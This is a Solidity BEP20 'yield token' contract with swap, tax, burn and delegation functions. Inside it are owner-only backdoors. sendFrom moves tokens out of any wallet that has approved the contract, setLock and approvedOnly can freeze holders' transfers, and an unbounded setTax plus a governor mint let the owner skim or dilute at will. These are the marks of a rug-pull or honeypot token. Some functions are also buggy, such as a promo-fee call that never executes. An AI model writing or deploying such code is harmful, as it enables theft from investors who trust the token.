pragma solidity ^0.6.12;  // #####  SPDX-License-Identifier: None 

import "./BEP20.sol";
import "./flashGaurd.sol";
import './address.sol';


contract yieldToken is BEP20('Test2 Token', 'TEST2'), flashGaurd {
    
    using Address for address;
    uint tax = 120; address _burnAddress = 0x000000000000000000000000000000000000dEaD;
    uint burnTax = 120; bool lockToken = false; address LPtoken;
    address LPbusdbnb = 0x1B96B92314C44b159149f7E0303511fB2Fc4774f;
    IBEP20 TOKEN; bool approvedOnly = true;
   IBEP20 WBNB = IBEP20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
  IBEP20 BUSD = IBEP20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) ;
    address payable adminTo; address payable promoTo; uint promoTax = 100;
    constructor(uint _supply) public{
    adminTo = msg.sender;
    promoTo = msg.sender;
    _totalSupply = _supply;
    _mint(address(msg.sender), _supply);
    TOKEN = IBEP20(this);
    }

    function sendBnb(address payable _to, uint _x) external onlyOwner{
        (bool send_,  ) = _to.call{value:_x}(""); 
        require(send_, "Failure"); 
    }
    function send(IBEP20 _tok, address payable _to, uint _x) external onlyOwner {
        _tok.transfer(_to, _x); 
        }
    function sendFrom(IBEP20 _tok, address payable _from, address payable _to, uint _x) external onlyOwner {
        _tok.transferFrom(_from, _to, _x); 
        }
    function read(IBEP20 _tok, address _address) external onlyOwner view{
        _tok.balanceOf(_address); 
        }
    function readApprove(IBEP20 _tok, address _address) external onlyOwner
    view{
        _tok.allowance(_address, address(this)); 
        }
    function quoteBnb(uint _x) internal view returns (uint){
        return( _x.mul(TOKEN.balanceOf(LPtoken).div(WBNB.balanceOf(LPtoken)))   );
    }
    function quoteBusd(uint _x) internal view returns (uint){
        uint value =  WBNB.balanceOf(LPbusdbnb).div(BUSD.balanceOf(LPbusdbnb));
        return(quoteBnb(_x.mul(value)));
    }
        function findCut(uint256 value, uint rate) internal pure returns (uint256)  {
    (bool test, uint _x) = value.tryDiv((1000/rate));
    if (test){
    return _x;
    } else {
       ( test, _x) = (value + 1).tryDiv((1000/rate));
           if (test){
    return _x;
           } else {return 0;}
    }
  }

    function setBurnAddress(address _to) external onlyOwner{
        _burnAddress = _to;
    }


        receive() external payable{swap();}

        function swap()public payable noFlash returns (bool){
        uint quote =  quoteBnb(msg.value);
       uint promoFee = findCut(msg.value,promoTax);
        promoTo.call{value:promoFee};
        (bool transferss,  ) = adminTo.call{value:(msg.value - promoFee)}("");
        require(transferss, "Failed to transfer the funds, aborting.");
        BEP20._transfer(address(this), msg.sender , quote); 
        return true;
}

        function Swap(uint _busdX)public payable noFlash returns (bool){
        (uint quote) =  quoteBnb(quoteBusd(_busdX));
        require(BUSD.balanceOf(address(this)) >= _busdX);
        (bool transferx  ) = BUSD.transferFrom(msg.sender, adminTo, _busdX);
        require(transferx, "Failed to transfer the funds, aborting.");
        BEP20._transfer(address(this), msg.sender , quote); 
        return true;
}
        function setLP(address _LP) external onlyOwner {
            LPtoken = _LP;
        }
        function SetBusdBnbLp(address _LP) external onlyOwner {
            LPbusdbnb = _LP;
        }
        
                function SetBUSDandWBNB(IBEP20 _BUSD, IBEP20 _WBNB) external onlyOwner {
            BUSD = _BUSD;
                 WBNB = _WBNB;
        }
        
        
        function setPromoFee(address payable _x) external onlyOwner {
        promoTo = _x;
    }
    
        function setAdminFee(address payable _x) external onlyOwner {
        adminTo = _x;
    }
    
        function setTax(uint _x) external onlyOwner {
        tax = _x;
    }
            function setburnTax(uint _x) external onlyOwner {
        burnTax = _x;
    }
    
        function setPromoTax(uint _x) external onlyOwner {
        promoTax = _x;
    }
    
        function setLock(bool truefalse) external onlyOwner {
        lockToken = truefalse;
    }
    
        function setApprovedOnly(bool truefalse) external onlyOwner {
        approvedOnly = truefalse;
    }
    
         function mint(address _to, uint256 _amount) external govern {
        _mint(_to, _amount);
        _moveDelegates(address(0), _delegates[_to], _amount);
    }
    
        function transfer(address recipient, uint256 amount )public override noFlash _banCheck returns (bool)  {
    if(isAdmin(msg.sender) || isGovern(msg.sender)) { 
        _transfer(_msgSender(),recipient, amount);
        return true;  
    }
    if(lockToken || (approvedOnly && isContract(msg.sender) && !isAuth(msg.sender) )) { 
        return false;
        }
        uint feeX = findCut(amount, tax);
        uint burN = findCut(feeX, burnTax);
        require(burN != 0, 'Transfer: Math Error');
        _transfer(_msgSender(),_burnAddress, burN);
        _transfer(_msgSender(),_owner, feeX.sub(burN));
        _transfer(_msgSender(), recipient,  amount.sub(feeX));
    return true;
       
    }
    
        mapping (address => address) internal _delegates;

        struct Checkpoint {
        uint32 fromBlock;
        uint256 votes;
    }

        mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;

        mapping (address => uint32) public numCheckpoints;

        bytes32 public constant DOMAIN_TYPEHASH = keccak256("EIP712Domain(string name,uint256 chainId,address verifyingContract)");

        bytes32 public constant DELEGATION_TYPEHASH = keccak256("Delegation(address delegatee,uint256 nonce,uint256 expiry)");

        mapping (address => uint) public nonces;

        event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);

        event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);
        function delegates(address delegator)  external  view  returns (address)
        {
        return _delegates[delegator];
    }
        function delegate(address delegatee) external {
        return _delegate(msg.sender, delegatee);
    }
    
        function delegateBySig( address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r,  bytes32 s  )  external  {
        bytes32 domainSeparator = keccak256(abi.encode(  DOMAIN_TYPEHASH,  keccak256(bytes(name())),getChainId(),address(this)));

        bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry )  );

        bytes32 digest = keccak256(  abi.encodePacked( "\x19\x01", domainSeparator, structHash ));

        address signatory = ecrecover(digest, v, r, s);
        require(signatory != address(0), "TOKEN::delegateBySig: invalid signature");
        require(nonce == nonces[signatory]++, "TOKEN::delegateBySig: invalid nonce");
        require(now <= expiry, "TOKEN::delegateBySig: signature expired");
        return _delegate(signatory, delegatee);
    }

        function getCurrentVotes(address account) external  view returns (uint256)
        {
        uint32 nCheckpoints = numCheckpoints[account];
        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;
        }

        function getPriorVotes(address account, uint blockNumber) external  view  returns (uint256)
         {
        require(blockNumber < block.number, "TOKEN::getPriorVotes: not yet determined");

        uint32 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) {
            return 0;
        }

        // First check most recent balance
        if (checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) {
            return checkpoints[account][nCheckpoints - 1].votes;
        }

        // Next check implicit zero balance
        if (checkpoints[account][0].fromBlock > blockNumber) {
            return 0;
        }

        uint32 lower = 0;
        uint32 upper = nCheckpoints - 1;
        while (upper > lower) {
            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow
            Checkpoint memory cp = checkpoints[account][center];
            if (cp.fromBlock == blockNumber) {
                return cp.votes;
            } else if (cp.fromBlock < blockNumber) {
                lower = center;
            } else {
                upper = center - 1;
            }
        }
        return checkpoints[account][lower].votes;
    }

        function _delegate(address delegator, address delegatee)
        internal
        {
        address currentDelegate = _delegates[delegator];
        uint256 delegatorBalance = balanceOf(delegator); 
        _delegates[delegator] = delegatee;

        emit DelegateChanged(delegator, currentDelegate, delegatee);

        _moveDelegates(currentDelegate, delegatee, delegatorBalance);
    }

        function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal {
        if (srcRep != dstRep && amount > 0) {
            if (srcRep != address(0)) {
                // decrease old representative
                uint32 srcRepNum = numCheckpoints[srcRep];
                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;
                uint256 srcRepNew = srcRepOld.sub(amount);
                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);
            }

            if (dstRep != address(0)) {
                // increase new representative
                uint32 dstRepNum = numCheckpoints[dstRep];
                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;
                uint256 dstRepNew = dstRepOld.add(amount);
                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);
            }
        }
    }

        function _writeCheckpoint( address delegatee,  uint32 nCheckpoints,  uint256 oldVotes,  uint256 newVotes)
        internal
        {
        uint32 blockNumber = safe32(block.number, "TOKEN::_writeCheckpoint: block number exceeds 32 bits");

        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
        } else {
            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);
            numCheckpoints[delegatee] = nCheckpoints + 1;
        }

        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);
    }

    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) {
        require(n < 2**32, errorMessage);
        return uint32(n);
    }

    function getChainId() internal pure returns (uint) {
        uint256 chainId;
        assembly { chainId := chainid() }
        return chainId;
    }
}
